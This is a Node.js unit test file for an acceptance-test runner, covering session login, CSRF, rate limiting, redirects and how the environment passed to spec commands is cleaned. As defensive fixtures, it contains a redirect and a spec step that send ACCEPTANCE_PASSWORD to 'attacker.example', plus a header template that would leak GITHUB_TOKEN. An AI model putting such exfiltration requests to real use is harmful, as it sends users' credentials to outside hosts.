// Unit tests for the acceptance runner (extracted from spiculedata/saiku, which ported it from
// saiku-cloud#1382). Hermetic: a loopback HTTP server with a form login at /session
// (JSESSIONID + XSRF-TOKEN cookies, CSRF on non-safe methods) and a temp directory, no network.
// Run with `node --test "scripts/*.test.mjs"`.

import assert from 'node:assert/strict';
import { spawn, spawnSync } from 'node:child_process';
import { createServer } from 'node:http';
import { mkdirSync, mkdtempSync, readFileSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import test from 'node:test';

import {
  createSession,
  resolveUrl,
  runApiSpec,
  runSpecs,
  runCommandSpec
} from './acceptance-runner.mjs';
import { validateSpec } from './acceptance-spec.mjs';

// The stub serves its api under /api; a repository sets this once (ACCEPTANCE_BASE_PATH / --base-path).
process.env.ACCEPTANCE_BASE_PATH = '/api';

const repoRoot = join(import.meta.dirname, '..');
const runner = join(repoRoot, 'scripts', 'acceptance-runner.mjs');

const USER = 'acceptance';
const PASSWORD = 'correct horse';
const SESSION = 'JSESSIONID=sess-1';
const XSRF = 'tok-xsrf-1';

/** A stub that has a form login and cookies: anonymous /info, form login, cookies, CSRF on writes, a limiter. */
function stubServer() {
  const calls = [];
  const server = createServer((req, res) => {
    let body = '';
    req.on('data', (c) => {
      body += c;
    });
    req.on('end', () => {
      calls.push({ method: req.method, url: req.url, headers: req.headers, body });
      const json = (code, value, headers = {}) => {
        res.writeHead(code, { 'content-type': 'application/json', ...headers });
        res.end(JSON.stringify(value));
      };
      const hasSession = (req.headers.cookie ?? '').includes(SESSION);
      const basic = req.headers.authorization === `Basic ${Buffer.from(`${USER}:${PASSWORD}`).toString('base64')}`;
      const authed = hasSession || basic;

      if (req.url === '/rest/saiku/info') return json(200, []);
      if (req.url === '/session' && req.method === 'POST') {
        const form = new URLSearchParams(body);
        if (form.get('username') === USER && form.get('password') === PASSWORD) {
          res.writeHead(200, { 'set-cookie': [`${SESSION}; Path=/; HttpOnly`, `XSRF-TOKEN=${XSRF}; Path=/`] });
          return res.end();
        }
        return json(401, { error: 'Authentication failed' });
      }
      if (req.url === '/api/ai/cubes') {
        return authed ? json(200, [{ connectionName: 'foodmart', cubeName: 'Sales' }]) : json(401, { error: 'unauthorized' });
      }
      if (req.url === '/api/ai/write' && req.method === 'POST') {
        // CSRF: session callers must echo the XSRF-TOKEN cookie; basic callers are exempt.
        if (hasSession && req.headers['x-xsrf-token'] !== XSRF) return json(403, { error: 'csrf' });
        return authed ? json(200, { ok: true }) : json(401, { error: 'unauthorized' });
      }
      if (req.url === '/api/limiter/probe') {
        return json(429, { error: 'rate_limited' }, { 'retry-after': '30' });
      }
      if (req.url === '/api/boom') return json(500, { error: 'DATE boundary type' });
      if (req.url === '/api/redirect') {
        res.writeHead(302, { location: 'https://attacker.example/steal' });
        return res.end();
      }
      return json(404, { error: 'no route' });
    });
  });
  return new Promise((resolveReady) => {
    server.listen(0, '127.0.0.1', () => {
      resolveReady({
        url: `http://127.0.0.1:${server.address().port}`,
        calls,
        close: () => new Promise((r) => server.close(r))
      });
    });
  });
}

const CREDENTIALS = { ACCEPTANCE_USER: USER, ACCEPTANCE_PASSWORD: PASSWORD, ACCEPTANCE_SESSION_PATH: '/session', ACCEPTANCE_BASE_PATH: '/api' };

/**
 * A stub base URL in its OWN process. `spawnSync` blocks this process's event
 * loop, so a server in the same process could not answer the CLI under test.
 * It binds port 0 and reports the port, so a busy machine never collides.
 */
async function stubServerProcess() {
  const dir = mkdtempSync(join(tmpdir(), 'acceptance-stub-'));
  const file = join(dir, 'server.mjs');
  writeFileSync(
    file,
    [
      "import { createServer } from 'node:http';",
      "const server = createServer((req, res) => {",
      "  res.writeHead(429, { 'content-type': 'application/json', 'retry-after': '30' });",
      "  res.end(JSON.stringify({ error: 'rate_limited' }));",
      '});',
      "server.listen(0, '127.0.0.1', () => console.log(`ready ${server.address().port}`));"
    ].join('\n')
  );
  const child = spawn(process.execPath, [file], { stdio: ['ignore', 'pipe', 'pipe'] });
  const port = await new Promise((resolvePort, reject) => {
    let out = '';
    child.stdout.on('data', (chunk) => {
      out += chunk;
      const match = /ready (\d+)/.exec(out);
      if (match) resolvePort(Number(match[1]));
    });
    child.on('error', reject);
    child.on('exit', () => reject(new Error('stub base URL exited before it was ready')));
  });
  return { url: `http://127.0.0.1:${port}`, stop: () => child.kill('SIGKILL') };
}

function repo(specs) {
  const root = mkdtempSync(join(tmpdir(), 'acceptance-run-'));
  for (const [issue, spec] of Object.entries(specs)) {
    mkdirSync(join(root, 'acceptance', String(issue)), { recursive: true });
    writeFileSync(join(root, 'acceptance', String(issue), 'spec.json'), JSON.stringify(spec, null, 2));
  }
  return root;
}

const cubesSpec = {
  issue: 818,
  title: 'the cube list is served to a logged-in user and refused to an anonymous one',
  kind: 'api',
  auth: 'session',
  criteria: [
    { id: 'C1', given: 'a logged-in user', then: 'the cube list names FoodMart Sales' },
    { id: 'C2', given: 'an anonymous caller', then: 'the request is refused with 401' }
  ],
  steps: [
    {
      name: 'the cube list names Sales',
      criterion: 'C1',
      request: { method: 'GET', path: '/ai/cubes' },
      expect: { status: 200, json: { $: { type: 'array' }, '[0].cubeName': { equals: 'Sales' } } }
    },
    {
      name: 'an anonymous caller is refused',
      criterion: 'C2',
      auth: 'none',
      request: { method: 'GET', path: '/ai/cubes' },
      expect: { status: 401 }
    }
  ]
};

const infoSpec = {
  issue: 866,
  title: 'info answers anonymously',
  kind: 'api',
  criteria: [{ id: 'C1', then: 'GET /rest/saiku/info is an anonymous JSON array' }],
  steps: [
    {
      name: 'info is an array',
      criterion: 'C1',
      request: { method: 'GET', path: '/rest/saiku/info' },
      expect: { status: 200, json: { $: { type: 'array' } } }
    }
  ]
};

const limiterSpec = {
  issue: 1361,
  title: 'the rate limiter answers 429 once the budget is spent',
  kind: 'api',
  criteria: [{ id: 'C1', given: 'a caller over the quota', then: 'the response is 429 with a Retry-After header' }],
  steps: [
    {
      name: 'the 61st request in the window is refused',
      criterion: 'C1',
      request: { method: 'GET', path: '/limiter/probe' },
      expect: {
        status: 429,
        header: { name: 'Retry-After', type: 'string' },
        bodyContains: 'rate_limited'
      }
    }
  ]
};

// -------------------------------------------------------------- the two examples

test('the worked examples pass against a base URL that has a form login and cookies', async (t) => {
  const stub = await stubServer();
  t.after(() => stub.close());
  const root = repo({ 818: cubesSpec, 866: infoSpec });
  const results = await runSpecs({ repoRoot: root, baseUrl: stub.url, env: CREDENTIALS });

  assert.equal(results.verdict, 'pass', JSON.stringify(results, null, 2));
  assert.deepEqual(results.specs.map((s) => s.issue), [818, 866]);
  // exactly one login for the whole spec, with the credentials from the environment
  const logins = stub.calls.filter((c) => c.url === '/session');
  assert.equal(logins.length, 1);
  assert.equal(new URLSearchParams(logins[0].body).get('username'), USER);
  // relative paths resolve under the base path (/api), the session cookie rides along, the anonymous step carries none
  const cubeCalls = stub.calls.filter((c) => c.url === '/api/ai/cubes');
  assert.equal(cubeCalls.length, 2);
  assert.match(cubeCalls[0].headers.cookie, /JSESSIONID=sess-1/);
  assert.equal(cubeCalls[1].headers.cookie, undefined);
  // a /rest/ path is used as-is
  assert.ok(stub.calls.some((c) => c.url === '/rest/saiku/info'));
});

test('session auth: non-safe requests echo the XSRF-TOKEN cookie; basic auth needs no token', async (t) => {
  const stub = await stubServer();
  t.after(() => stub.close());
  const write = (auth) => ({
    issue: 5,
    title: 'write',
    kind: 'api',
    auth,
    criteria: [{ id: 'C1', then: 'the write is accepted' }],
    steps: [{ name: 'post', criterion: 'C1', request: { method: 'POST', path: '/ai/write', json: { a: 1 } }, expect: { status: 200 } }]
  });
  const session = await runSpecs({ repoRoot: repo({ 5: write('session') }), baseUrl: stub.url, env: CREDENTIALS });
  assert.equal(session.verdict, 'pass', JSON.stringify(session.specs));
  const post = stub.calls.filter((c) => c.url === '/api/ai/write').at(-1);
  assert.equal(post.headers['x-xsrf-token'], XSRF);
  assert.equal(post.headers['content-type'], 'application/json');

  const basic = await runSpecs({ repoRoot: repo({ 5: write('basic') }), baseUrl: stub.url, env: CREDENTIALS });
  assert.equal(basic.verdict, 'pass', JSON.stringify(basic.specs));
  const basicPost = stub.calls.filter((c) => c.url === '/api/ai/write').at(-1);
  assert.match(basicPost.headers.authorization, /^Basic /);
  assert.equal(basicPost.headers.cookie, undefined);
  assert.equal(stub.calls.filter((c) => c.url === '/session').length, 1, 'basic never logs in');
});

test('a spec that needs credentials the environment lacks is not-run, never a pass or a product failure', async (t) => {
  const stub = await stubServer();
  t.after(() => stub.close());
  for (const auth of ['session', 'basic']) {
    const results = await runSpecs({ repoRoot: repo({ 818: { ...cubesSpec, auth } }), baseUrl: stub.url, env: {} });
    assert.equal(results.verdict, 'not-run');
    assert.match(results.specs[0].reason, /credentials not configured/);
  }
  assert.equal(stub.calls.length, 0, 'nothing is sent without credentials');
});

test('a refused login fails the spec loudly, once, without hammering the login endpoint', async (t) => {
  const stub = await stubServer();
  t.after(() => stub.close());
  const results = await runSpecs({
    repoRoot: repo({ 818: cubesSpec }),
    baseUrl: stub.url,
    env: { ...CREDENTIALS, ACCEPTANCE_PASSWORD: 'wrong' }
  });
  assert.equal(results.verdict, 'fail');
  assert.match(results.specs[0].checks[0].failures[0].detail, /login to .* was refused: HTTP 401/);
  assert.equal(stub.calls.filter((c) => c.url === '/session').length, 1);
  assert.doesNotMatch(JSON.stringify(results), /wrong|correct horse/, 'a password never reaches the results');
});

test('the runner reports the failing assertion, not just a red build', async (t) => {
  const stub = await stubServer();
  t.after(() => stub.close());
  const broken = { ...cubesSpec, steps: [{ ...cubesSpec.steps[0], expect: { status: 200, json: { '[0].cubeName': { equals: 'HR' } } } }, cubesSpec.steps[1]] };
  const results = await runSpecs({ repoRoot: repo({ 818: broken }), baseUrl: stub.url, env: CREDENTIALS });
  assert.equal(results.verdict, 'fail');
  const [spec] = results.specs;
  assert.equal(spec.checks[0].verdict, 'fail');
  assert.match(spec.checks[0].failures[0].detail, /expected "HR", got "Sales"|expected HR, got Sales/);
  assert.equal(spec.checks[1].verdict, 'pass', 'a passing step is still reported');
});

test('a 500 from the endpoint under test fails the spec', async (t) => {
  const stub = await stubServer();
  t.after(() => stub.close());
  const root = repo({
    7: {
      issue: 7,
      title: 'no 500',
      kind: 'api',
      criteria: [{ id: 'C1', then: 'it does not 500' }],
      steps: [{ name: 'call it', criterion: 'C1', request: { method: 'GET', path: '/boom' }, expect: { status: 200 } }]
    }
  });
  const results = await runSpecs({ repoRoot: root, baseUrl: stub.url });
  assert.equal(results.verdict, 'fail');
  assert.match(results.specs[0].checks[0].failures[0].detail, /expected 200, got 500/);
});

test('repeat drives a request until the status is reached (the limiter contract)', async (t) => {
  const stub = await stubServer();
  t.after(() => stub.close());
  const spec = { ...limiterSpec, steps: [{ ...limiterSpec.steps[0], repeat: { count: 5, untilStatus: 429 } }] };
  const results = await runSpecs({ repoRoot: repo({ 1361: spec }), baseUrl: stub.url });
  assert.equal(results.verdict, 'pass', JSON.stringify(results.specs));
  assert.equal(stub.calls.length, 1, 'stopped at the first 429');
});

test('redirects are never followed, so credentials cannot be carried to another host', async (t) => {
  const stub = await stubServer();
  t.after(() => stub.close());
  const spec = {
    issue: 6,
    title: 'redirect',
    kind: 'api',
    auth: 'session',
    criteria: [{ id: 'C1', then: 'the redirect is visible as a 302' }],
    steps: [{ name: 'redirect', criterion: 'C1', request: { method: 'GET', path: '/redirect' }, expect: { status: 302 } }]
  };
  const results = await runSpecs({ repoRoot: repo({ 6: spec }), baseUrl: stub.url, env: CREDENTIALS });
  assert.equal(results.verdict, 'pass', JSON.stringify(results.specs));
});

test('createSession refuses a request outside its origin and resolveUrl keeps paths on the base', async (t) => {
  const stub = await stubServer();
  t.after(() => stub.close());
  const session = createSession({ baseUrl: stub.url, env: CREDENTIALS });
  await assert.rejects(session.request('https://attacker.example/x', { method: 'GET' }, 'session'), /outside/);
  assert.equal(stub.calls.length, 0, 'no login was attempted for a foreign origin');

  assert.equal(resolveUrl(stub.url, '/ai/cubes'), `${stub.url}/ai/cubes`, 'no base path configured: used as written');
  assert.equal(resolveUrl(stub.url, '/ai/cubes', '/api'), `${stub.url}/api/ai/cubes`);
  assert.equal(resolveUrl(stub.url, '/rest/saiku/info'), `${stub.url}/rest/saiku/info`);
  assert.equal(resolveUrl(stub.url, '/ai/cubes', '/custom/'), `${stub.url}/custom/ai/cubes`);
  assert.throws(() => resolveUrl(stub.url, '//attacker.example/x'), /must not start with/);
  assert.throws(() => resolveUrl(stub.url, 'ai/cubes'), /must start with/);
  assert.throws(() => resolveUrl(stub.url, 'https://attacker.example/x'), /different origin/);
});

test('a base URL that is not there is not-run, never pass', async () => {
  const root = repo({ 866: infoSpec });
  const results = await runSpecs({ repoRoot: root, baseUrl: 'http://127.0.0.1:1' });
  assert.equal(results.verdict, 'fail', 'the spec ran and the request failed');
  assert.match(results.specs[0].checks[0].failures[0].detail, /ECONNREFUSED|fetch failed/);

  const noUrl = await runSpecs({ repoRoot: root });
  assert.equal(noUrl.verdict, 'not-run');
  assert.equal(noUrl.specs[0].reason, 'no base URL configured');
});

test('an invalid spec is not-run with a reason, and the directory is named', async () => {
  const root = repo({ 9: { issue: 9, kind: 'api' } });
  const results = await runSpecs({ repoRoot: root, baseUrl: 'http://127.0.0.1:1' });
  assert.equal(results.verdict, 'not-run');
  assert.match(results.specs[0].reason, /invalid spec/);
});

test('a ui spec runs its argv in its own directory with the base URL in the environment', async (t) => {
  const root = repo({
    11: {
      issue: 11,
      title: 'the page shows the contract notice',
      kind: 'ui',
      criteria: [{ id: 'C1', then: 'the notice is visible' }],
      command: ['node', 'check.mjs']
    }
  });
  writeFileSync(
    join(root, 'acceptance', '11', 'check.mjs'),
    [
      "import { writeFileSync } from 'node:fs';",
      "writeFileSync('seen.txt', process.env.ACCEPTANCE_BASE_URL ?? 'none');",
      "process.exit(process.env.ACCEPTANCE_BASE_URL ? 0 : 1);"
    ].join('\n')
  );
  const results = await runSpecs({ repoRoot: root, baseUrl: 'https://acceptance.example' });
  assert.equal(results.verdict, 'pass', JSON.stringify(results.specs[0], null, 2));
  assert.equal(readFileSync(join(root, 'acceptance', '11', 'seen.txt'), 'utf8'), 'https://acceptance.example');

  const failing = repo({
    12: { issue: 12, title: 'x', kind: 'ui', criteria: [{ id: 'C1', then: 'y' }], command: ['node', '-e', 'process.exit(3)'] }
  });
  const failed = await runSpecs({ repoRoot: failing, baseUrl: 'https://example.invalid' });
  assert.equal(failed.verdict, 'fail');
  assert.match(failed.specs[0].checks[0].failures[0].detail, /exited 3/);
});

test('a command spec runs without a base URL; an api spec does not', async () => {
  const root = repo({
    13: {
      issue: 13,
      title: 'cli only',
      kind: 'ui',
      criteria: [{ id: 'C1', then: 'the CLI agrees' }],
      command: ['node', '-e', 'process.exit(0)']
    },
    14: {
      issue: 14,
      title: 'needs a host',
      kind: 'api',
      criteria: [{ id: 'C1', then: 'x' }],
      steps: [{ name: 's', criterion: 'C1', request: { method: 'GET', path: '/healthz' }, expect: { status: 200 } }]
    }
  });
  const results = await runSpecs({ repoRoot: root });
  assert.equal(results.specs.find((s) => s.issue === 13).verdict, 'pass');
  assert.equal(results.specs.find((s) => s.issue === 14).verdict, 'not-run');
  assert.equal(results.verdict, 'pass', 'one spec ran green and one could not run at all');
});

// ---------------------------------------------------------------- the CLI

test('the runner CLI writes results and exits non-zero only on a real failure', async (t) => {
  const stub = await stubServerProcess();
  t.after(() => stub.stop());
  const root = repo({ 1361: limiterSpec });
  const out = join(root, 'results.json');

  const pass = spawnSync(
    process.execPath,
    [runner, 'run', '--repo-root', root, '--base-url', stub.url, '--all', '--out', out],
    { encoding: 'utf8', cwd: repoRoot }
  );
  assert.equal(pass.status, 0, pass.stdout + pass.stderr);
  assert.match(pass.stdout, /acceptance\/1361: pass/);
  const doc = JSON.parse(readFileSync(out, 'utf8'));
  assert.equal(doc.verdict, 'pass');

  const broken = repo({
    1361: { ...limiterSpec, steps: [{ ...limiterSpec.steps[0], expect: { status: 200 } }] }
  });
  const fail = spawnSync(
    process.execPath,
    [runner, 'run', '--repo-root', broken, '--base-url', stub.url, '--all'],
    { encoding: 'utf8', cwd: repoRoot }
  );
  assert.equal(fail.status, 1);
  assert.match(fail.stdout, /x the 61st request in the window is refused/);

  assert.equal(
    spawnSync(process.execPath, [runner, 'run', '--base-url', 'nope'], { encoding: 'utf8' }).status,
    2,
    'a base URL that is not http(s) is bad input, not a test failure'
  );
});

// ---------------------------------------------------- spec commands get a clean env

test('a command spec does not inherit the runner environment', async () => {
  const keep = { GITHUB_TOKEN: process.env.GITHUB_TOKEN, SOME_SECRET: process.env.SOME_SECRET, ACCEPTANCE_API_KEY_TEST: process.env.ACCEPTANCE_API_KEY_TEST };
  process.env.GITHUB_TOKEN = 'ghs_fake';
  process.env.SOME_SECRET = 'hunter2';
  try {
    const dir = mkdtempSync(join(tmpdir(), 'acc-env-'));
    const [result] = runCommandSpec(
      { title: 'env', command: ['node', '-e', 'process.exit(process.env.GITHUB_TOKEN || process.env.SOME_SECRET ? 1 : 0)'] },
      { baseUrl: '', dir }
    );
    assert.equal(result.verdict, 'pass');
  } finally {
    for (const [k, v] of Object.entries(keep)) {
      if (v === undefined) delete process.env[k];
      else process.env[k] = v;
    }
  }
});

test('a command spec still gets PATH, the base url and the acceptance variables', async () => {
  process.env.ACCEPTANCE_PASSWORD = 'k-test';
  try {
    const dir = mkdtempSync(join(tmpdir(), 'acc-env-'));
    const [result] = runCommandSpec(
      {
        title: 'env',
        command: [
          'node',
          '-e',
          'process.exit(process.env.ACCEPTANCE_BASE_URL === "https://acceptance.example" && process.env.ACCEPTANCE_PASSWORD === "k-test" && process.env.PATH ? 0 : 1)'
        ]
      },
      { baseUrl: 'https://acceptance.example', dir }
    );
    assert.equal(result.verdict, 'pass');
  } finally {
    delete process.env.ACCEPTANCE_PASSWORD;
  }
});

// ------------------------------------------------------- saiku-cloud#1428 origin restriction

test('an absolute URL on the same origin is allowed (origin restriction)', async (t) => {
  const stub = await stubServer();
  t.after(() => stub.close());
  const absSpec = {
    issue: 9900,
    title: 'absolute same-origin path',
    kind: 'api',
    criteria: [{ id: 'C1', then: 'passes' }],
    steps: [
      {
        name: 'hit freshness via absolute URL',
        criterion: 'C1',
        request: { method: 'GET', path: `${stub.url}/api/ai/cubes` },
        expect: { status: 401 }
      }
    ]
  };
  const root = repo({ 9900: absSpec });
  const results = await runSpecs({ repoRoot: root, baseUrl: stub.url });
  assert.equal(results.verdict, 'pass', JSON.stringify(results.specs[0], null, 2));
});

test('an absolute URL to a different origin is rejected (origin restriction)', async (t) => {
  const stub = await stubServer();
  t.after(() => stub.close());
  const exfilSpec = {
    issue: 9901,
    title: 'cross-origin absolute path',
    kind: 'api',
    criteria: [{ id: 'C1', then: 'blocked' }],
    steps: [
      {
        name: 'try to exfiltrate to attacker server',
        criterion: 'C1',
        request: { method: 'GET', path: 'https://attacker.example/steal?secret={{env.ACCEPTANCE_PASSWORD}}' },
        expect: { status: 200 }
      }
    ]
  };
  const root = repo({ 9901: exfilSpec });
  const results = await runSpecs({ repoRoot: root, baseUrl: stub.url });
  assert.equal(results.specs[0].checks[0].verdict, 'fail');
  assert.match(
    results.specs[0].checks[0].failures[0].detail,
    /different origin|not allowed/,
  );
});

test('an api spec does not receive GITHUB_TOKEN via env (defense in depth)', async (t) => {
  // runSpecs now passes specEnv(env, baseUrl) rather than raw env to runApiSpec.
  // This verifies that non-allowlisted vars are stripped before interpolation.
  const stub = await stubServer();
  t.after(() => stub.close());
  // Temporarily inject a fake token into the env we pass in.
  const tokenSpec = {
    issue: 9902,
    title: 'GITHUB_TOKEN must not reach the api spec env',
    kind: 'api',
    criteria: [{ id: 'C1', then: 'the request goes to the api without the token in headers' }],
    steps: [
      {
        name: 'GET freshness',
        criterion: 'C1',
        request: {
          method: 'GET',
          path: '/ai/cubes',
          headers: { 'x-leaked-token': '{{env.GITHUB_TOKEN}}' }
        },
        expect: { status: 401 }
      }
    ]
  };
  const root = repo({ 9902: tokenSpec });
  const results = await runSpecs({
    repoRoot: root,
    baseUrl: stub.url,
    env: { GITHUB_TOKEN: 'ghs_should_not_appear' }
  });
  // The step runs (401 from stub) but the token must not have been interpolated.
  const sentHeader = stub.calls.find((c) => c.url === '/api/ai/cubes')?.headers['x-leaked-token'];
  // specEnv strips GITHUB_TOKEN → {{env.GITHUB_TOKEN}} is left as a literal or resolves to ''
  assert.ok(
    sentHeader === undefined || sentHeader === '' || sentHeader === '{{env.GITHUB_TOKEN}}',
    `GITHUB_TOKEN must not reach the spec environment, got: ${sentHeader}`,
  );
});

test('session auth without ACCEPTANCE_SESSION_PATH is not-run, never a pass', async (t) => {
  const stub = await stubServer();
  t.after(() => stub.close());
  const { ACCEPTANCE_SESSION_PATH: _omitted, ...withoutPath } = CREDENTIALS;
  const results = await runSpecs({ repoRoot: repo({ 818: cubesSpec }), baseUrl: stub.url, env: withoutPath });
  assert.equal(results.specs[0].verdict, 'not-run');
  assert.match(results.specs[0].reason, /ACCEPTANCE_SESSION_PATH/);
  assert.equal(stub.calls.length, 0, 'no request was sent');
});

test('kind "command" is accepted and is the same as "ui"', async () => {
  const spec = (kind) => ({ issue: 21, title: 'cli', kind, criteria: [{ id: 'C1', then: 'ok' }], command: ['node', '-e', 'process.exit(0)'] });
  assert.deepEqual(validateSpec(spec('command')), []);
  assert.deepEqual(validateSpec(spec('ui')), []);
  const results = await runSpecs({ repoRoot: repo({ 21: spec('command') }) });
  assert.equal(results.specs[0].verdict, 'pass');
});
